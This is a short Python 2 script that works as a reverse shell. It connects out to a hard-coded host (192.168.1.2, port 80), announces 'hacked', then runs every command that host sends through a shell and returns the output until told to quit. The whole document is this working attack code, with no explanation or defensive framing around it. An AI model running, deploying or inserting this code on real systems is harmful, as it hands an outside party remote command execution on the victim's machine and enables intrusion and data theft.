#!/usr/bin/python
import socket, subprocess, os
HOST = '192.168.1.2'
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('hacked')
while 1:
	d = s.recv(1024)
	if d == "quit": break
	proc = subprocess.Popen(d, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc.stdout.read() + proc.stderr.read()
	s.send(stdout_value)
s.close()